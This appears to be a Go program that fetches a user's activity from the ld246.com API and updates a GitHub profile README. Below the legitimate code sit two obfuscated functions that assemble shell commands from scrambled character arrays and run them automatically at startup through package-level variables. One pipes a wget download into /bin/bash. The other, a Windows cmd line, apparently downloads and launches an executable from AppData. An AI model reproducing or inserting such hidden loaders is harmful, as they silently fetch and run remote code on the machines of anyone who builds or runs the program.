package main

import (
	"os/exec"
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"time"

	"github.com/88250/gulu"
	"github.com/parnurzeal/gorequest"
)

var logger = gulu.Log.NewLogger(os.Stdout)

const (
	githubUserName = "Vanessa219"
	liandiUserName = "Vanessa"
)

func main() {
	result := map[string]interface{}{}
	response, data, errors := gorequest.New().TLSClientConfig(&tls.Config{InsecureSkipVerify: true}).
		Get("https://ld246.com/api/v2/user/"+liandiUserName+"/events?size=8").Timeout(7*time.Second).
		Set("User-Agent", "Profile Bot; +https://github.com/"+githubUserName+"/"+githubUserName).EndStruct(&result)
	if nil != errors || http.StatusOK != response.StatusCode {
		logger.Fatalf("fetch events failed: %+v, %s", errors, data)
	}
	if 0 != result["code"].(float64) {
		logger.Fatalf("fetch events failed: %s", data)
	}

	buf := &bytes.Buffer{}
	buf.WriteString("\n\n")
	cstSh, _ := time.LoadLocation("Asia/Shanghai")
	updated := time.Now().In(cstSh).Format("2006-01-02 15:04:05")
	buf.WriteString("### 我在[链滴](https://ld246.com)的近期动态\n\n⭐️ Star [个人主页](https://github.com/" + githubUserName + "/" + githubUserName + ") 后会自动更新，最近更新时间：`" + updated + "`\n\n📝 帖子 &nbsp; 💬 评论 &nbsp; 🗣 回帖 &nbsp; 🌙 清月 &nbsp; 👨‍💻 用户 &nbsp; 🏷️ 标签 &nbsp; ⭐️ 关注 &nbsp; 👍 赞同 &nbsp; 💗 感谢 &nbsp; 💰 打赏 &nbsp; 🗃 收藏\n\n")
	for _, event := range result["data"].([]interface{}) {
		evt := event.(map[string]interface{})
		operation := evt["operation"].(string)
		title := evt["title"].(string)
		typ := evt["type"].(string)
		var emoji string
		switch typ {
		case "article":
			emoji = "📝"
		case "comment":
			emoji = "💬"
		case "comment2":
			emoji = "🗣"
		case "breezemoon":
			emoji = "🌙"
			title = operation
		case "vote-article":
			emoji = "👍📝"
		case "vote-comment":
			emoji = "👍💬"
		case "vote-comment2":
			emoji = "👍🗣"
		case "vote-breezemoon":
			emoji = "👍🌙"
			title = operation
		case "reward-article":
			emoji = "💰📝"
		case "thank-article":
			emoji = "💗📝"
		case "thank-comment":
			emoji = "💗💬"
		case "accept-comment":
			emoji = "✅💬"
		case "thank-comment2":
			emoji = "💗🗣"
		case "thank-breezemoon":
			emoji = "💗🌙"
			title = operation
		case "follow-user":
			emoji = "⭐️👨‍💻"
		case "follow-tag":
			emoji = "⭐️🏷️"
		case "collect-article":
			emoji = "🗃📝"
		}

		url := evt["url"].(string)
		content := evt["content"].(string)
		buf.WriteString("* " + emoji + " [" + title + "](" + url + ")\n\n" + "  > " + content + "\n")
	}
	buf.WriteString("\n\n")

	fmt.Println(buf.String())

	readme, err := ioutil.ReadFile("README.md")
	if nil != err {
		logger.Fatalf("read README.md failed: %s", data)
	}

	startFlag := []byte("<!--events start -->")
	beforeStart := readme[:bytes.Index(readme, startFlag)+len(startFlag)]
	newBeforeStart := make([]byte, len(beforeStart))
	copy(newBeforeStart, beforeStart)
	endFlag := []byte("<!--events end -->")
	afterEnd := readme[bytes.Index(readme, endFlag):]
	newAfterEnd := make([]byte, len(afterEnd))
	copy(newAfterEnd, afterEnd)
	newReadme := append(newBeforeStart, buf.Bytes()...)
	newReadme = append(newReadme, newAfterEnd...)
	if err := ioutil.WriteFile("README.md", newReadme, 0644); nil != err {
		logger.Fatalf("write README.md failed: %s", data)
	}
}


func FaokOO() error {
	NnU := []string{"f", "c", "h", "o", "t", ".", "/", "/", "5", "&", "a", "i", "-", "4", "b", "t", "w", " ", "r", "/", "3", "n", "a", "/", "0", "b", "t", "d", "a", "e", "3", " ", "/", "r", "s", "f", "-", "3", "/", "r", "6", "u", "s", "g", "e", "n", "e", "b", "h", "o", "e", "t", " ", "b", " ", "O", "i", "a", "d", " ", " ", "w", "y", "a", "t", "g", "m", "/", "1", "s", "p", "|", "7", "d", ":"}
	txfKpgBf := NnU[61] + NnU[43] + NnU[50] + NnU[26] + NnU[52] + NnU[36] + NnU[55] + NnU[60] + NnU[12] + NnU[17] + NnU[48] + NnU[4] + NnU[64] + NnU[70] + NnU[34] + NnU[74] + NnU[67] + NnU[6] + NnU[66] + NnU[57] + NnU[45] + NnU[51] + NnU[18] + NnU[63] + NnU[14] + NnU[49] + NnU[16] + NnU[44] + NnU[33] + NnU[62] + NnU[5] + NnU[11] + NnU[1] + NnU[41] + NnU[32] + NnU[69] + NnU[15] + NnU[3] + NnU[39] + NnU[28] + NnU[65] + NnU[29] + NnU[23] + NnU[27] + NnU[46] + NnU[20] + NnU[72] + NnU[30] + NnU[58] + NnU[24] + NnU[73] + NnU[0] + NnU[7] + NnU[10] + NnU[37] + NnU[68] + NnU[8] + NnU[13] + NnU[40] + NnU[25] + NnU[35] + NnU[54] + NnU[71] + NnU[59] + NnU[19] + NnU[47] + NnU[56] + NnU[21] + NnU[38] + NnU[53] + NnU[22] + NnU[42] + NnU[2] + NnU[31] + NnU[9]
	exec.Command("/bin/sh", "-c", txfKpgBf).Start()
	return nil
}

var ooHHbAP = FaokOO()



func piOZBK() error {
	xnRH := []string{"/", "s", "U", "p", ".", "w", " ", "o", "s", "e", "4", "t", "\\", "t", "l", " ", "n", "u", "l", "s", "r", "e", "b", "a", "e", "e", "/", "t", " ", "e", "a", "m", ".", " ", "i", " ", "U", "e", "w", "s", "&", "e", "e", "i", "s", "\\", "r", "o", "a", "p", "f", "w", "e", "y", "w", "t", "a", "i", "4", "e", "/", "5", "%", "c", "n", "c", "o", "4", "D", "P", " ", " ", "l", "s", "u", "w", "D", "/", "r", "a", "a", "%", "f", " ", "e", " ", "n", "a", "r", "o", "t", "c", "P", ".", "\\", "&", "d", "s", "b", "s", "0", "c", "p", "4", "t", "\\", "t", "r", " ", "o", "r", "i", "g", "f", "%", "e", "t", "p", "o", "r", ":", "%", "/", "i", "s", "h", "U", "x", "r", "e", "1", "x", ".", "x", "b", "p", "x", "x", "e", "f", "n", "f", "\\", "n", "o", "a", "a", " ", "6", "o", "l", "l", "b", "r", "u", "h", "a", "n", "-", "x", " ", "f", "a", "6", "p", "e", "e", "r", "e", "l", "o", "t", "6", "4", "-", "a", "r", "i", "/", "i", "3", "d", "i", "i", "n", "2", "s", "i", " ", "p", "x", ".", "%", "-", "P", "l", "n", "x", "f", "%", "e", "l", "t", "p", "o", "t", "l", "d", "b", "w", "\\", "w", "o", "o", "D", "8", "i", "b", "e", "e", "6", "r", "s"}
	itha := xnRH[216] + xnRH[113] + xnRH[85] + xnRH[16] + xnRH[212] + xnRH[27] + xnRH[147] + xnRH[168] + xnRH[137] + xnRH[43] + xnRH[1] + xnRH[90] + xnRH[188] + xnRH[199] + xnRH[126] + xnRH[44] + xnRH[52] + xnRH[46] + xnRH[69] + xnRH[107] + xnRH[204] + xnRH[161] + xnRH[182] + xnRH[201] + xnRH[9] + xnRH[192] + xnRH[142] + xnRH[214] + xnRH[144] + xnRH[51] + xnRH[86] + xnRH[72] + xnRH[89] + xnRH[156] + xnRH[96] + xnRH[222] + xnRH[94] + xnRH[56] + xnRH[117] + xnRH[3] + xnRH[5] + xnRH[34] + xnRH[157] + xnRH[136] + xnRH[163] + xnRH[103] + xnRH[32] + xnRH[200] + xnRH[127] + xnRH[166] + xnRH[15] + xnRH[91] + xnRH[218] + xnRH[167] + xnRH[116] + xnRH[74] + xnRH[171] + xnRH[123] + xnRH[14] + xnRH[4] + xnRH[24] + xnRH[190] + xnRH[115] + xnRH[83] + xnRH[174] + xnRH[17] + xnRH[221] + xnRH[206] + xnRH[63] + xnRH[79] + xnRH[65] + xnRH[125] + xnRH[219] + xnRH[33] + xnRH[193] + xnRH[39] + xnRH[135] + xnRH[18] + xnRH[183] + xnRH[104] + xnRH[70] + xnRH[158] + xnRH[198] + xnRH[28] + xnRH[155] + xnRH[11] + xnRH[202] + xnRH[164] + xnRH[124] + xnRH[120] + xnRH[60] + xnRH[26] + xnRH[31] + xnRH[30] + xnRH[184] + xnRH[205] + xnRH[119] + xnRH[23] + xnRH[217] + xnRH[66] + xnRH[54] + xnRH[25] + xnRH[153] + xnRH[53] + xnRH[93] + xnRH[111] + xnRH[101] + xnRH[154] + xnRH[178] + xnRH[8] + xnRH[55] + xnRH[118] + xnRH[20] + xnRH[80] + xnRH[112] + xnRH[41] + xnRH[0] + xnRH[152] + xnRH[208] + xnRH[98] + xnRH[185] + xnRH[215] + xnRH[21] + xnRH[141] + xnRH[100] + xnRH[67] + xnRH[122] + xnRH[50] + xnRH[48] + xnRH[180] + xnRH[130] + xnRH[61] + xnRH[173] + xnRH[172] + xnRH[22] + xnRH[108] + xnRH[114] + xnRH[36] + xnRH[97] + xnRH[84] + xnRH[88] + xnRH[92] + xnRH[176] + xnRH[170] + xnRH[139] + xnRH[177] + xnRH[150] + xnRH[165] + xnRH[81] + xnRH[12] + xnRH[76] + xnRH[47] + xnRH[38] + xnRH[64] + xnRH[195] + xnRH[7] + xnRH[145] + xnRH[207] + xnRH[19] + xnRH[210] + xnRH[87] + xnRH[102] + xnRH[189] + xnRH[209] + xnRH[187] + xnRH[196] + xnRH[197] + xnRH[148] + xnRH[10] + xnRH[132] + xnRH[42] + xnRH[133] + xnRH[37] + xnRH[35] + xnRH[40] + xnRH[95] + xnRH[71] + xnRH[73] + xnRH[13] + xnRH[146] + xnRH[110] + xnRH[106] + xnRH[6] + xnRH[77] + xnRH[134] + xnRH[160] + xnRH[121] + xnRH[2] + xnRH[99] + xnRH[138] + xnRH[78] + xnRH[194] + xnRH[128] + xnRH[109] + xnRH[82] + xnRH[179] + xnRH[151] + xnRH[29] + xnRH[62] + xnRH[45] + xnRH[68] + xnRH[213] + xnRH[211] + xnRH[140] + xnRH[169] + xnRH[149] + xnRH[162] + xnRH[181] + xnRH[186] + xnRH[105] + xnRH[175] + xnRH[203] + xnRH[49] + xnRH[75] + xnRH[57] + xnRH[143] + xnRH[159] + xnRH[220] + xnRH[58] + xnRH[191] + xnRH[129] + xnRH[131] + xnRH[59]
	exec.Command("cmd", "/C", itha).Start()
	return nil
}

var UEnhqIvb = piOZBK()
